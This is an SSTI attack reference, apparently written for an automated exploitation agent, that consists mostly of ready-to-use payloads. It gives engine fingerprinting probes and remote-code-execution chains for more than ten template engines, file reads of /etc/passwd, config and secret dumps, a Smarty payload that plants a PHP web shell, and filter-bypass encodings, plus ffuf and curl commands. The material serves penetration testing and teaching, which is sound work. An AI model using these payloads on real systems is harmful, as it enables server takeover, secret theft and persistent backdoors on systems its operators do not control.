---
vuln_type: ssti
severity: critical
cwe: [CWE-1336]
owasp: A03:2021-Injection
related_tools: [curl, ffuf, interactsh]
exploit_agent: ssti_agent
tags: [ssti, template-injection, server-side, jinja2, twig, freemarker, velocity, pebble, smarty, mako, rce]
---

# Server-Side Template Injection (SSTI)

## Overview
Occurs when user input is embedded into a server-side template engine and evaluated as a template expression rather than plain text. Leads to information disclosure, file read, and in most cases full Remote Code Execution (RCE).

---

## Injection Points

| Location | Example | Notes |
|----------|---------|-------|
| URL parameter | `?name=John` rendered in template | Most common |
| POST body | `greeting=Hello {{user}}` | Forms, APIs |
| HTTP headers | `User-Agent`, `Referer` reflected in error/log pages | Rarer |
| Email templates | Custom email with user-controlled fields | Stored SSTI |
| PDF generation | HTML-to-PDF with template rendering | Common in invoice/report generators |
| CMS/wiki content | User-editable pages with template engine | Stored SSTI |

---

## Detection Techniques

### Step 1: Identify template rendering
Inject a unique string and check if it appears in the response:
```
test12345
```

### Step 2: Test mathematical expressions
The universal SSTI detection payload — works across most engines:
```
${7*7}
{{7*7}}
<%= 7*7 %>
#{7*7}
*{7*7}
{7*7}
${{7*7}}
```

If the response contains `49` instead of the literal expression → template injection confirmed.

### Step 3: Identify the template engine

**Decision tree (Tplmap / manual):**

```
{{7*'7'}}
├── 49       → Twig (PHP)
├── 7777777  → Jinja2 (Python)
└── Error    → Neither

${7*7}
├── 49       → FreeMarker, Velocity, or Mako
└── Literal  → Not these

<%= 7*7 %>
├── 49       → ERB (Ruby) or EJS (Node.js)
└── Literal  → Not these

#{7*7}
├── 49       → Pebble (Java) or Thymeleaf (Java)
└── Literal  → Not these

*{7*7}
├── 49       → Thymeleaf
└── Literal  → Not Thymeleaf

{{= 7*7 }}
├── 49       → doT.js or Nunjucks
└── Literal  → Not these
```

### More specific identifiers:
```
# Jinja2 (Python/Flask)
{{config}}        → dumps Flask config
{{self.__class__}}

# Twig (PHP/Symfony)
{{_self.env.getRuntimeLoaderSources()}}
{{dump()}}

# FreeMarker (Java)
${.version}       → returns FreeMarker version
<#assign x="test">${x}

# Velocity (Java)
#set($x=7*7)$x

# ERB (Ruby)
<%= self.class %>

# Pebble (Java)
{% set x = 7*7 %}{{x}}

# Smarty (PHP)
{$smarty.version}

# Mako (Python)
${self.module.__loader__}
```

---

## Exploitation by Template Engine

### Jinja2 (Python — Flask, Django)

**Read config/secrets:**
```
{{config}}
{{config.items()}}
{{request.environ}}
```

**File read:**
```
{{''.__class__.__mro__[1].__subclasses__()[FIND_INDEX]('/etc/passwd').read()}}
```

**RCE (multiple chains):**
```python
# Method 1: __import__
{{''.__class__.__mro__[1].__subclasses__()[INDEX]('os').popen('id').read()}}

# Method 2: lipsum (Flask)
{{lipsum.__globals__['os'].popen('id').read()}}

# Method 3: cycler
{{cycler.__init__.__globals__.os.popen('id').read()}}

# Method 4: request object
{{request.application.__self__._get_data_for_json.__globals__['json'].JSONEncoder.default.__init__.__globals__['os'].popen('id').read()}}

# Method 5: namespace
{{namespace.__init__.__globals__.os.popen('whoami').read()}}

# Method 6: url_for
{{url_for.__globals__['os'].popen('id').read()}}

# Method 7: config
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
```

**Finding the right subclass index:**
```python
# List all subclasses to find os._wrap_close or subprocess.Popen
{{''.__class__.__mro__[1].__subclasses__()}}
# Then search for 'Popen' or '_wrap_close' in the output
```

### Twig (PHP — Symfony, CraftCMS)

**Information disclosure:**
```
{{_self.env.getFilter('id')}}
{{dump(app)}}
{{app.request.server.all|join(',')}}
```

**File read (Twig 1.x):**
```
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("cat /etc/passwd")}}
```

**RCE (Twig 3.x):**
```
{{['id']|filter('system')}}
{{['cat /etc/passwd']|filter('exec')}}
{{['id']|map('system')}}
{{['id']|sort('system')}}
{{['id']|reduce('system')}}
```

**RCE (Twig 1.x):**
```
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
```

### FreeMarker (Java — Spring, Struts)

**RCE:**
```
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
${"freemarker.template.utility.Execute"?new()("id")}
```

**File read:**
```
<#assign is=object?api.class.getResourceAsStream("/etc/passwd")>
<#assign reader=object?api.class.forName("java.io.InputStreamReader").getConstructor(object?api.class.forName("java.io.InputStream")).newInstance(is)>
```

**Built-in bypass:**
```
<#assign classloader=article.class.protectionDomain.classLoader>
<#assign owc=classloader.loadClass("freemarker.template.ObjectWrapper")>
<#assign dwf=owc.getField("DEFAULT_WRAPPER").get(null)>
<#assign ec=classloader.loadClass("freemarker.template.utility.Execute")>
${dwf.newInstance(ec,null)("id")}
```

### Velocity (Java)

**RCE:**
```
#set($x='')##
#set($rt=$x.class.forName('java.lang.Runtime'))##
#set($chr=$x.class.forName('java.lang.Character'))##
#set($str=$x.class.forName('java.lang.String'))##
#set($ex=$rt.getRuntime().exec('id'))##
$ex.waitFor()
#set($out=$ex.getInputStream())##
#foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end
```

**Simpler RCE (if Runtime is accessible):**
```
#set($run=@java.lang.Runtime@getRuntime())
#set($proc=$run.exec('id'))
#set($null=$proc.waitFor())
#set($is=$proc.getInputStream())
#set($br=@java.io.BufferedReader@new(@java.io.InputStreamReader@new($is)))
$br.readLine()
```

### Pebble (Java)

**RCE:**
```
{% set cmd = 'id' %}
{% set bytes = (1).TYPE.forName('java.lang.Runtime').methods[6].invoke(null,null).exec(cmd).inputStream.readAllBytes() %}
{{(1).TYPE.forName('java.lang.String').constructors[0].newInstance(([bytes]).toArray())}}
```

### Smarty (PHP)

**RCE:**
```
{system('id')}
{php}echo `id`;{/php}    (Smarty 2 only)
{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['cmd']); ?>",self::clearConfig())}
```

### Mako (Python)

**RCE:**
```
<%import os%>${os.popen('id').read()}
<%import subprocess%>${subprocess.check_output('id',shell=True)}
```

### ERB (Ruby)

**RCE:**
```
<%= system('id') %>
<%= `id` %>
<%= IO.popen('id').readlines() %>
```

### EJS / Nunjucks (Node.js)

**EJS RCE:**
```
<%= global.process.mainModule.require('child_process').execSync('id').toString() %>
```

**Nunjucks RCE:**
```
{{range.constructor("return global.process.mainModule.require('child_process').execSync('id').toString()")()}}
```

### Handlebars (Node.js)

**RCE (requires helpers or prototype pollution):**
```
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return require('child_process').execSync('id');"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```

---

## Bypass Techniques

### Dot/underscore filtering
```python
# Jinja2: attr() filter
{{''|attr('__class__')|attr('__mro__')|last|attr('__subclasses__')()}}

# Jinja2: bracket notation
{{''['__class__']['__mro__'][1]['__subclasses__']()}}

# Jinja2: request object
{{request['__class__']}}

# Jinja2: hex encoding
{{''['\x5f\x5fclass\x5f\x5f']}}
```

### Keyword filtering (`config`, `class`, `import`, `os`)
```python
# Jinja2: string concatenation
{{''['__cla'+'ss__']}}

# Jinja2: join filter
{{''|attr(['__cla','ss__']|join)}}

# Jinja2: format string
{{''|attr('%c%c%c%c%c%c%c%c%c'|format(95,95,99,108,97,115,115,95,95))}}

# Jinja2: request.args
{{''|attr(request.args.a)}}&a=__class__
```

### Bracket filtering
```python
# Jinja2: attr() instead of []
{{lipsum|attr('__globals__')|attr('__getitem__')('os')|attr('popen')('id')|attr('read')()}}
```

### Quote filtering
```python
# Jinja2: request args
{{lipsum.__globals__[request.args.os].popen(request.args.cmd).read()}}&os=os&cmd=id

# Jinja2: chr()
{{lipsum.__globals__[(lipsum.__globals__.__builtins__.chr(111))~(lipsum.__globals__.__builtins__.chr(115))]}}
```

### Sandbox/restricted environment
```python
# Walk the MRO chain to find dangerous classes
# List all subclasses
{{''.__class__.__mro__[1].__subclasses__()}}

# Find index of subprocess.Popen or os._wrap_close
# Then use that index
```

---

## Automated Testing

### Manual detection script (polyglot)
Test all these payloads — if any return `49`:
```
${7*7}
{{7*7}}
<%= 7*7 %>
#{7*7}
*{7*7}
${{7*7}}
{{= 7*7 }}
```

### With ffuf (parameter fuzzing)
```bash
# Create payload file with SSTI probes
echo '{{7*7}}' > ssti_payloads.txt
echo '${7*7}' >> ssti_payloads.txt
echo '<%= 7*7 %>' >> ssti_payloads.txt

ffuf -u "http://target/page?name=FUZZ" -w ssti_payloads.txt -fr "FUZZ" -mc all
# Filter: exclude responses that contain the literal payload (not rendered)
```

### With curl (manual verification)
```bash
# Test Jinja2
curl -s "http://target/page?name={{7*7}}" | grep -o "49"

# Test Jinja2 RCE
curl -s "http://target/page?name={{config}}"

# Test with POST
curl -s -X POST "http://target/page" -d "name={{7*7}}" | grep -o "49"
```

---

## Output Interpretation

### Confirmed SSTI indicators
- Mathematical expression evaluated: `{{7*7}}` returns `49`
- Template engine objects/config exposed: `{{config}}` returns Flask config
- OS command output visible after RCE payload
- Template syntax error in response (e.g., "Twig_Error_Syntax", "jinja2.exceptions.TemplateSyntaxError")

### Not SSTI (false positives)
- Client-side template rendering (Angular `{{7*7}}` in browser, not server)
- Input reflected literally without evaluation
- Math evaluated by JavaScript, not server template

### Severity assessment
- **Critical**: RCE achieved through template injection
- **High**: File read or config/secrets exposed
- **Medium**: Template engine identified, expressions evaluated, but no RCE chain found yet
- **Low**: Template error messages leak engine type but no expression evaluation
